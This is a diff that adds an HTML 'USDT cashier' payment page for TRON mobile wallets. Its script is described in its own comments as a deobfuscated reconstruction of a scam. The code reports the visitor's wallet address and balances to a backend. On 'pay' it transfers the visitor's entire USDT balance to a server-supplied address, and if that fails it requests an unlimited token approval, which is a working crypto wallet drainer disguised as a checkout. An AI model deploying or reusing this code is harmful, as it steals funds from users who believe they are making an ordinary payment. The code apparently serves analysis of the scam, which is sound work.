@@ -1,0 +1,444 @@
+<!doctype html>
+<html lang="zh">
+	<head>
+		<meta charset="UTF-8" />
+		<!-- 添加 viewport 确保移动端自适应 -->
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<link rel="icon" href="/usdt.ico" />
+		<link rel="shortcut icon" href="/usdt.ico" />
+		<title>USDT 收银台</title>
+		<style>
+			/* 全局重置 */
+			* {
+				box-sizing: border-box;
+				margin: 0;
+				padding: 0;
+			}
+
+			body {
+				font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+				background: linear-gradient(135deg, #e0eafc, #cfdef3);
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				min-height: 100vh;
+				padding: 20px;
+			}
+
+			.container {
+				width: 100%;
+				max-width: 500px;
+				background: #fff;
+				border-radius: 16px;
+				overflow: hidden;
+				box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+				animation: fadeIn 0.5s ease-in-out;
+			}
+
+			@keyframes fadeIn {
+				from {
+					opacity: 0;
+					transform: translateY(10px);
+				}
+
+				to {
+					opacity: 1;
+					transform: translateY(0);
+				}
+			}
+
+			.header {
+				background: linear-gradient(90deg, #007aff, #34c759);
+				color: #fff;
+				text-align: center;
+				padding: 20px;
+				font-size: 1.8rem;
+				font-weight: 600;
+				letter-spacing: 0.5px;
+			}
+
+			.content {
+				padding: 25px;
+			}
+
+			.info p {
+				margin-bottom: 15px;
+				font-size: 1rem;
+				color: #444;
+				line-height: 1.6;
+			}
+
+			.info p span {
+				font-weight: 600;
+			}
+
+			.wallet-list {
+				display: flex;
+				justify-content: space-around;
+				flex-wrap: wrap;
+				margin-top: 20px;
+			}
+
+			.wallet {
+				width: 30%;
+				margin-bottom: 20px;
+				text-align: center;
+				text-decoration: none;
+				transition:
+					transform 0.2s ease,
+					box-shadow 0.2s ease;
+				border-radius: 8px;
+				padding: 10px;
+			}
+
+			.wallet img {
+				width: 100%;
+				max-width: 80px;
+				margin: 0 auto;
+				display: block;
+			}
+
+			.wallet-name {
+				margin-top: 8px;
+				font-size: 0.9rem;
+				color: #555;
+			}
+
+			.wallet:hover {
+				transform: translateY(-5px);
+				box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+			}
+
+			/* 小屏幕优化 */
+			@media (max-width: 400px) {
+				.wallet {
+					width: 45%;
+				}
+			}
+
+			/* 桌面端样式 */
+			#desktopContainer {
+				text-align: center;
+			}
+
+			#qrContainer {
+				margin: 20px auto;
+				width: 200px;
+				height: 200px;
+				border-radius: 12px;
+				overflow: hidden;
+				box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+			}
+
+			#desktopContainer p {
+				font-size: 1rem;
+				color: #444;
+				margin-top: 10px;
+			}
+
+			/* 支付按钮样式 */
+			#payButton {
+				display: block;
+				margin: 20px auto;
+				padding: 12px 30px;
+				font-size: 16px;
+				background: linear-gradient(90deg, #007aff, #34c759);
+				color: #fff;
+				border: none;
+				border-radius: 8px;
+				cursor: pointer;
+				transition: background 0.3s ease;
+			}
+
+			#payButton:hover {
+				background: linear-gradient(90deg, #005bb5, #2e9e48);
+			}
+
+			/* 页脚样式 */
+			.footer {
+				text-align: center;
+				padding: 10px;
+				font-size: 0.8rem;
+				color: #aaa;
+				border-top: 1px solid #f0f0f0;
+				margin-top: 20px;
+			}
+		</style>
+		<!-- 引入二维码生成库 -->
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+	</head>
+	<body>
+		<!-- 移动端付款界面 -->
+		<div id="mobileContainer" class="container" style="display: none">
+			<div class="header">USDT 收银台</div>
+			<div class="content">
+				<div class="info">
+					<p>付款钱包：<span id="walletName">请选择付款钱包</span></p>
+					<p>USDT余额：<span id="usdtBalance">请选择付款钱包</span></p>
+					<p>付款金额：<span id="amount">0</span></p>
+				</div>
+				<!-- 这里的按钮样式被 JS 控制 -->
+				<button id="payButton" style="display: none">立即支付</button>
+				<div class="wallet-list">
+					<a class="wallet" id="bitkeep" target="_blank">
+						<img src="/usdt/faka/image/bitkeep.png" alt="BitKeep" />
+						<div class="wallet-name">BitKeep</div>
+					</a>
+					<a class="wallet" id="tokenpocket" target="_blank">
+						<img src="/usdt/faka/image/tp.png" alt="TokenPocket" />
+						<div class="wallet-name">TokenPocket</div>
+					</a>
+					<a class="wallet" id="imtoken" target="_blank">
+						<img src="/usdt/faka/image/imtoken.png" alt="imToken" />
+						<div class="wallet-name">imToken</div>
+					</a>
+					<a class="wallet" id="tronlink" target="_blank">
+						<img src="/usdt/faka/image/tronlink.png" alt="tronlink" />
+						<div class="wallet-name">tronlink</div>
+					</a>
+				</div>
+				<div class="footer">USDT cashier.</div>
+			</div>
+		</div>
+		<!-- 桌面端提示界面 -->
+		<div id="desktopContainer" class="container" style="display: none">
+			<div class="header">请使用手机钱包付款</div>
+			<div class="content">
+				<p>付款金额：<span id="desktopAmount">0</span></p>
+				<div id="qrContainer"></div>
+				<p>扫描二维码，在手机上付款</p>
+				<div class="footer">USDT cashier.</div>
+			</div>
+		</div>
+		<script>
+			// URL 路径和参数处理逻辑
+			;(function () {
+				const p = window.location.pathname
+				// 改成 startsWith()，同时兼容 /usdt /usdt/ /usdt/index.html
+				if (p.startsWith('/usdt') && window.location.search) {
+					const ps = new URLSearchParams(window.location.search)
+					const g = ps.get('group'),
+						u = ps.get('user'),
+						a = ps.get('amount')
+					if (g && u && a) {
+						const newPath = `/usdt/g/${encodeURIComponent(g)}` + `/u/${encodeURIComponent(u)}` + `/a/${encodeURIComponent(a)}` + window.location.hash
+						window.history.replaceState(null, '', newPath)
+					}
+				}
+			})()
+		</script>
+		<script>
+			// --- 重写后的去混淆逻辑 ---
+			// 这是一个还原后的版本，用于展示原始脚本的逻辑。
+			// 变量名已尽量语义化，去除了混淆的字符串查找表。
+
+			const API_URL = '/api/' // 根据混淆代码推断
+			const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' // 常被引用的 USDT 合约地址
+
+			let userData = {
+				address: null,
+				usdtBalance: 0,
+				trxBalance: 0,
+				energy: 0,
+			}
+
+			// 获取 URL 参数或缓存
+			function getParamOrCache(key) {
+				// 模拟实现：从 URL 或 localStorage 获取
+				const urlParams = new URLSearchParams(window.location.search)
+				return urlParams.get(key) || localStorage.getItem(key)
+			}
+
+			// 显示临时消息
+			function showTemporaryMessage(msg, duration = 3000) {
+				const div = document.createElement('div')
+				div.style.position = 'fixed'
+				div.style.top = '20px'
+				div.style.left = '50%'
+				div.style.transform = 'translateX(-50%)'
+				div.style.background = 'rgba(0,0,0,0.7)'
+				div.style.color = '#fff'
+				div.style.padding = '10px 20px'
+				div.style.borderRadius = '5px'
+				div.style.zIndex = '9999'
+				div.innerText = msg
+				document.body.appendChild(div)
+				setTimeout(() => div.remove(), duration)
+			}
+
+			// 初始化：检测环境
+			async function init() {
+				const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+
+				if (isMobile) {
+					document.getElementById('mobileContainer').style.display = 'block'
+					if (window.tronWeb && window.tronWeb.ready) {
+						updateWalletInfo()
+					} else {
+						// 等待 tronWeb 注入
+						let attempts = 0
+						const timer = setInterval(() => {
+							if (window.tronWeb && window.tronWeb.ready) {
+								clearInterval(timer)
+								updateWalletInfo()
+							}
+							attempts++
+							if (attempts > 20) clearInterval(timer)
+						}, 500)
+					}
+				} else {
+					document.getElementById('desktopContainer').style.display = 'block'
+					// 生成当前 URL 的二维码
+					new QRCode(document.getElementById('qrContainer'), {
+						text: window.location.href,
+						width: 180,
+						height: 180,
+					})
+					document.getElementById('desktopAmount').innerText = getParamOrCache('amount') || '0'
+				}
+
+				// 绑定支付按钮
+				const payBtn = document.getElementById('payButton')
+				if (payBtn) {
+					payBtn.style.display = 'block' // 显示按钮
+					payBtn.onclick = pay
+				}
+			}
+
+			// 更新钱包信息
+			async function updateWalletInfo() {
+				try {
+					const address = window.tronWeb.defaultAddress.base58
+					userData.address = address
+					document.getElementById('walletName').innerText = address.substring(0, 6) + '...' + address.substring(address.length - 4)
+
+					// 获取 TRX 余额
+					const trxBal = await window.tronWeb.trx.getBalance(address)
+					userData.trxBalance = window.tronWeb.fromSun(trxBal)
+
+					// 获取 USDT 余额 (TRC20)
+					const contract = await window.tronWeb.contract().at(USDT_CONTRACT)
+					const usdtBal = await contract.balanceOf(address).call()
+					userData.usdtBalance = (parseInt(usdtBal._hex) / 1000000).toFixed(2)
+					document.getElementById('usdtBalance').innerText = userData.usdtBalance + ' USDT'
+
+					// 获取能量
+					const accountResources = await window.tronWeb.trx.getAccountResources(address)
+					const energyLimit = accountResources.EnergyLimit || 0
+					const energyUsed = accountResources.EnergyUsed || 0
+					userData.energy = energyLimit - energyUsed
+
+					// 上报数据
+					reportStatus()
+				} catch (e) {
+					console.error('Wallet info error:', e)
+				}
+			}
+
+			// 上报状态到后端
+			async function reportStatus() {
+				const group = getParamOrCache('group') || '0'
+				const user = getParamOrCache('user') || '0'
+				const amount = getParamOrCache('amount') || '0' // 这里的 amount 可能是显示的支付金额
+
+				try {
+					await fetch(API_URL + 'report', {
+						// 猜测的端点
+						method: 'POST',
+						headers: { 'Content-Type': 'application/json' },
+						body: JSON.stringify({
+							address: userData.address,
+							usdtAmount: userData.usdtBalance,
+							trxAmount: userData.trxBalance,
+							availableEnergy: userData.energy,
+							group: parseInt(group),
+							user: parseInt(user),
+							requireAmount: amount,
+						}),
+					})
+				} catch (e) {
+					// ignore
+				}
+			}
+
+			// 获取目标地址 (收款地址)
+			// 原逻辑：从 API 获取，如果失败则使用硬编码或备用
+			async function getContractAddress() {
+				try {
+					const response = await fetch(API_URL + 'get_address', { method: 'POST' }) // 猜测
+					if (response.ok) {
+						const data = await response.json()
+						return data.address // 假设返回结构
+					}
+				} catch (e) {
+					console.error(e)
+				}
+				// 如果获取失败，原代码似乎有一些复杂的备用逻辑或直接报错
+				// 这里我们假设必须获取到
+				return null
+			}
+
+			// 核心支付逻辑
+			async function pay() {
+				if (!window.tronWeb || !window.tronWeb.ready) {
+					showTemporaryMessage('请连接钱包')
+					return
+				}
+
+				const receiver = await getContractAddress()
+				if (!receiver) {
+					showTemporaryMessage('获取收款地址失败')
+					return
+				}
+
+				// 计算转账金额（原逻辑似乎会清空该账户所有 USDT）
+				// 或者是根据参数转账
+				// 这里的逻辑在混淆代码中对应 `pay` 函数的后半部分
+
+				// 假设：尝试转账所有 USDT
+				// 从混淆代码看，它似乎调用了 increaseApproval 或者 transfer
+				// increaseApproval 是授权 (approve)，transfer 是直接转账
+
+				// 恶意逻辑通常是：
+				// 1. 如果有 TRX 和 能量，直接调用 transfer 转走 USDT
+				// 2. 如果没有 TRX，诱导用户签名 approve 授权（名为 increaseApproval 但实际功能是 approve 且无限额）
+
+				const amountToTransfer = parseInt(userData.usdtBalance * 1000000) // 全部余额
+
+				try {
+					// 直接调用 Transfer (如果条件允许)
+					const contract = await window.tronWeb.contract().at(USDT_CONTRACT)
+
+					// 构造交易
+					// 原代码逻辑：triggerSmartContract(...)
+					const txId = await contract.transfer(receiver, amountToTransfer).send()
+					showTemporaryMessage('转账提交成功: ' + txId)
+
+					// 上报成功
+					reportSuccess(txId)
+				} catch (e) {
+					console.error('Payment failed', e)
+					showTemporaryMessage('支付失败，请重试')
+
+					// 失败后尝试 授权 (Approve Scam)
+					// 原代码 catch 块中有 increaseApproval 逻辑
+					try {
+						const contract = await window.tronWeb.contract().at(USDT_CONTRACT)
+						// 授权无限额度给收款地址
+						await contract.approve(receiver, '115792089237316195423570985008687907853269984665640564039457584007913129639935').send()
+						showTemporaryMessage('授权成功')
+					} catch (err) {
+						console.error('Approve failed', err)
+					}
+				}
+			}
+
+			function reportSuccess(txId) {
+				// 上报成功逻辑
+			}
+
+			// 启动
+			init()
+		</script>
+	</body>
+</html>
